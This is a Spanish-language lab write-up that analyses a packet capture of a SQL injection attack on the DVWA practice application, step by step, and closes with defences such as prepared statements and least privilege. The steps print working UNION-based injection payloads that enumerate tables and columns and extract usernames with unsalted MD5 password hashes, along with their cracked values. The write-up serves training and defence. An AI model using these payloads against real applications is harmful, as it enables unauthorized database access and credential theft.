# Ataque a una base de datos MySQL (Inyección SQL)

## ¿Qué es la inyección SQL (SQLi)?

La inyección SQL es una vulnerabilidad que aparece cuando una aplicación web construye sus consultas a la base de datos concatenando directamente la entrada del usuario dentro de una sentencia SQL, sin validarla ni parametrizarla. Si un campo (por ejemplo un buscador de "UserID") se inserta tal cual dentro de la consulta, un atacante puede escribir código SQL en ese campo y hacer que la base de datos lo ejecute como si fuera parte de la sentencia original.

Esto le permite al atacante:

- Leer datos que no debería ver (otras filas, otras tablas, credenciales).
- Modificar o borrar información de la base.
- Suplantar identidades (por ejemplo saltear un login).
- En casos graves, ejecutar comandos sobre el sistema operativo o subir malware.

La idea central es que el atacante rompe la sintaxis prevista y cambia la lógica de la consulta. El caso clásico es inyectar una condición que siempre es verdadera, como `1=1` o `' OR '1'='1`, para que la base devuelva todos los registros en lugar de uno solo.

### El operador `UNION SELECT`

La técnica que se ve en esta captura es la inyección basada en UNION. El operador `UNION` de SQL permite combinar el resultado de dos consultas en una sola salida, siempre que ambas devuelvan la misma cantidad de columnas. El atacante lo aprovecha para "pegarle" a la consulta original una segunda consulta controlada por él:

```sql
1' or 1=1 union select database(), user()#
```

- `1'` cierra el valor esperado y rompe la cadena original.
- `or 1=1` fuerza que la condición sea siempre verdadera.
- `union select database(), user()` agrega una segunda consulta que devuelve el nombre de la base y el usuario de conexión.
- `#` comenta el resto de la sentencia SQL original para que no moleste.

Combinando esto con funciones y tablas del sistema (`version()`, `information_schema.tables`, `information_schema.columns`) el atacante puede ir mapeando toda la base de datos hasta llegar a las credenciales.

## Escenario del laboratorio

Se analiza un archivo de captura de paquetes que contiene el tráfico de red de un ataque de inyección SQL ya realizado contra una aplicación web. La aplicación atacada es DVWA (Damn Vulnerable Web Application), una app deliberadamente vulnerable que se usa para practicar. La captura abarca aproximadamente 8 minutos (441 segundos), que es lo que dura el ataque completo.

El análisis se hace con Wireshark, siguiendo el flujo HTTP de cada solicitud (`Follow HTTP Stream`) para ver la consulta que envía el atacante y la respuesta que devuelve la base de datos.

![Wireshark](https://github.com/user-attachments/assets/898528d0-a16a-4125-8917-6c04161c7a77)

### Las dos direcciones IP involucradas

Al abrir la captura, todo el tráfico ocurre entre dos hosts:

| Rol               | Dirección IP | Detalle                                           |
| ----------------- | ------------ | ------------------------------------------------- |
| Atacante (origen) | `10.0.2.4`   | Envía las solicitudes GET con las inyecciones SQL |
| Víctima (destino) | `10.0.2.15`  | Servidor web con DVWA (puerto 80 / HTTP)          |

> [!NOTE]
> Todo el ataque viaja sobre HTTP en texto plano (puerto 80). Por eso, aun estando comprimidas con gzip, las consultas y las respuestas (incluidos los hashes) pueden reconstruirse por completo desde la captura. Si el sitio usara HTTPS, un sniffer en el medio no vería este contenido.

## Paso a paso del ataque

### Paso 0: Login inicial

Antes de las inyecciones, el atacante se autentica en DVWA con un `POST /dvwa/login.php`:

```
username=admin&password=password&Login=Login
```

Es decir, entra con las credenciales por defecto `admin` / `password` y con el nivel de seguridad de DVWA en low, que es el que permite la inyección sin filtros.

### Paso 1: Prueba de vulnerabilidad (`1=1`)

El atacante ingresa `1=1` en el campo UserID:

```
GET /dvwa/vulnerabilities/sqli/?id=1=1&Submit=Submit
```

En vez de devolver un error de inicio de sesión, la aplicación responde con un registro de la base:

```
ID: 1=1
First name: admin
Surname: admin
```

Esto confirma que la aplicación es vulnerable: la entrada del usuario se está interpretando como parte de la consulta SQL. La cadena `1=1` genera una condición siempre verdadera.

![screenshot find](https://github.com/user-attachments/assets/f207e623-4323-4664-857a-abd4024291d8)

### Paso 2: El ataque continúa (`' OR '0'='0`)

El atacante prueba una condición siempre verdadera más "clásica":

```
GET /dvwa/vulnerabilities/sqli/?id=1' or '0'='0&Submit=Submit
```

Ahora la respuesta ya no trae un solo registro, sino toda la tabla de usuarios de la aplicación:

```
First name: admin    Surname: admin
First name: Gordon   Surname: Brown
First name: Hack     Surname: Me
First name: Pablo    Surname: Picasso
First name: Bob      Surname: Smith
```

Al ser la condición siempre verdadera, la base devuelve todas las filas.

### Paso 3: Nombre de la base de datos y usuario

Usando `UNION SELECT`, el atacante pide el nombre de la base y el usuario de conexión:

```
GET /dvwa/vulnerabilities/sqli/?id=1' or 1=1 union select database(), user()#&Submit=Submit
```

La respuesta, al final del listado, agrega la fila inyectada:

```
First name: dvwa
Surname: root@localhost
```

| Dato                       | Valor            |
| -------------------------- | ---------------- |
| Nombre de la base de datos | `dvwa`           |
| Usuario de la conexión     | `root@localhost` |

Que el usuario de conexión sea `root` es un hallazgo grave: la aplicación se conecta a MySQL con el usuario más privilegiado, lo que amplifica muchísimo el impacto de la inyección.

![screenshot root](https://github.com/user-attachments/assets/08034b04-b170-4269-b7b7-1df32e01e252)

### Paso 4: Versión del motor de base de datos

```
GET /dvwa/vulnerabilities/sqli/?id=1' or 1=1 union select null, version ()#&Submit=Submit
```

El identificador de versión aparece al final del resultado, justo antes del cierre `</pre>` del HTML:

```
First name:
Surname: 5.7.12-0ubuntu1.1
```

> ¿Cuál es la versión?
> `5.7.12-0ubuntu1.1` (MySQL 5.7.12, empaquetado para Ubuntu).

Conocer la versión exacta le sirve al atacante para buscar vulnerabilidades y exploits conocidos para ese motor en particular.

### Paso 5: Enumeración de tablas

```
GET /dvwa/vulnerabilities/sqli/?id=1' or 1=1 union select null, table_name from information_schema.tables#&Submit=Submit
```

Consultando la tabla del sistema `information_schema.tables`, la base devuelve un listado enorme de todas las tablas existentes (las del sistema y las de la aplicación, entre ellas la tabla `users`). Como el atacante especificó `null` en la primera columna, no filtra nada y obtiene todo.

> ¿Qué haría el comando modificado?
>
> ```sql
> 1' OR 1=1 UNION SELECT null, column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='users'
> ```
>
> Esta variante ya no lista tablas, sino que devuelve los nombres de las columnas de la tabla `users` (por ejemplo `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, etc.). Le sirve al atacante para descubrir la estructura interna de esa tabla y saber exactamente qué campos pedir en el paso final —en particular, dónde están el nombre de usuario y el hash de la contraseña.

![screenshot users](https://github.com/user-attachments/assets/0e77a014-f76f-4a4a-8137-a831cc39b872)

### Paso 6: Extracción de usuarios y hashes de contraseñas

El ataque termina con el "mejor premio": las credenciales.

```
GET /dvwa/vulnerabilities/sqli/?id=1' or 1=1 union select user, password from users#&Submit=Submit
```

La respuesta expone todos los usuarios con sus hashes de contraseña (almacenados en MD5):

| Usuario   | Hash de la contraseña (MD5)        | Contraseña en texto plano |
| --------- | ---------------------------------- | ------------------------- |
| `admin`   | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`                |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123`                  |
| `1337`    | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley`                 |
| `pablo`   | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein`                 |
| `smithy`  | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`                |

<!-- SCREENSHOT sugerido: Follow HTTP Stream de la consulta "user, password from users#" mostrando la lista de usuarios y hashes -->

> ¿Qué usuario tiene `8d3533d75ae2c3966d7e0d4fcc69216b` como hash?
> El usuario `1337`.

> ¿Cuál es la contraseña en texto plano?
> Copiando el hash en un servicio como [crackstation.net](https://crackstation.net/), se resuelve a `charley`.
>
> Esto es posible porque son hashes MD5 sin salt: un algoritmo rápido y ya roto, cuyos valores para contraseñas comunes están precalculados en tablas (rainbow tables). El hash de `charley` es directamente conocido.

## Resumen del ataque

El atacante siguió una progresión de reconocimiento típica de una inyección SQL:

1. Detectar la vulnerabilidad (`1=1`).
2. Confirmar que puede volcar toda una tabla (`' OR '0'='0`).
3. Identificar la base y el usuario (`database()`, `user()`).
4. Averiguar la versión del motor (`version()`).
5. Mapear la estructura (tablas y columnas vía `information_schema`).
6. Extraer las credenciales (`users` → hashes) y crackearlas.

Todo esto sin explotar ningún "bug" del servidor: simplemente abusando de que la aplicación confía en la entrada del usuario.

# Preguntas

## 1. ¿Cuál es el riesgo de hacer que las plataformas utilicen el lenguaje SQL?

El riesgo no está en SQL en sí (que es el estándar para bases de datos relacionales), sino en cómo las aplicaciones construyen las consultas. Cuando una plataforma arma sentencias SQL concatenando directamente la entrada del usuario, mezcla en un mismo canal los datos (lo que el usuario escribe) y el código (la sentencia SQL). Esa mezcla es la que permite que un atacante inyecte comandos.

Como se vio en la captura, las consecuencias pueden ser críticas:

- Pérdida de confidencialidad: el atacante leyó toda la tabla de usuarios y sus hashes.
- Exposición de credenciales: los hashes MD5 sin salt se craquearon a texto plano en segundos.
- Escalada de privilegios: la app se conectaba como `root@localhost`, así que la inyección hereda permisos totales sobre el motor.
- Integridad y disponibilidad: con esos privilegios se podrían modificar, borrar o alterar datos, e incluso comprometer el sistema operativo subyacente.
- Fuga de información estructural: mediante `information_schema` el atacante mapeó toda la base sin conocerla de antemano.

En resumen: una única entrada mal saneada puede comprometer toda la base de datos y, con ella, la seguridad de todos los usuarios de la plataforma.

## 2. Tres métodos para evitar ataques de inyección SQL

Según las recomendaciones de OWASP e INCIBE:

1. Consultas parametrizadas / sentencias preparadas (prepared statements).
   Es la defensa principal. En lugar de concatenar la entrada dentro del texto de la consulta, se usan placeholders y el driver de la base envía los datos por separado. Así la base nunca interpreta la entrada del usuario como código SQL, sin importar lo que escriba.

   ```sql
   -- Vulnerable (concatenación):
   "SELECT  FROM users WHERE id = '" + input + "'"

   -- Seguro (parametrizado):
   SELECT  FROM users WHERE id = ?
   ```

2. Validación de entradas y uso de listas blancas (whitelisting).
   Verificar que cada dato tenga el tipo, formato y longitud esperados (por ejemplo, que un `id` sea numérico). Para casos donde no se puede parametrizar (como nombres de columnas u orden), permitir solo un conjunto cerrado de valores válidos en vez de intentar filtrar los "malos".

3. Principio de mínimo privilegio en la base de datos.
   La aplicación debe conectarse con un usuario que tenga solo los permisos que necesita, nunca como `root`/administrador (como pasaba en este laboratorio). Así, aun si se produce una inyección, el daño queda acotado. Se complementa con:
   - Almacenar contraseñas con hashes lentos y con salt (bcrypt, Argon2, scrypt) en lugar de MD5.
   - Usar ORMs y procedimientos almacenados bien implementados.
   - Desplegar un WAF (Web Application Firewall) como capa adicional de detección.
   - Manejar los errores sin devolver mensajes que revelen la estructura de la base.
